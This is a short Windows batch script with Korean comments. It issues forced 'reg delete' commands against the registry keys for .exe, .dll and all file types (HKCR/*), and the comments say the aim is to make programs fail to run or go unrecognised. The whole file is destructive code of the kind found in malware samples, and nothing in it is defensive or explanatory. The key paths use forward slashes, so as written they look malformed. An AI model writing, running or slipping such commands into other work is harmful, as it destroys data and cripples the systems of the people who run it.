@Echo OFF
:: .exe 파일 확장자에 대한 모든 연결 정보를 레지스트리에서 삭제 시도
:: .exe 파일을 실행할 수 없게 만들거나, .exe 파일이 정상적으로 인식되지 않게 할 수 있음
START reg delete HKCR/.exe /f

:: .dll 파일 확장자에 대한 정보를 삭제
:: 프로그램이 정상적으로 동작하지 않을 수 있음
START reg delete HKCR/.dll /f

:: HKCR/*는 모든 파일과 관련된 기본 설정을 포함하는 레지스트리 항목
:: 모든 파일 유형에 대한 레지스트리 설정을 삭제하려는 시도
START reg delete HKCR/* /f
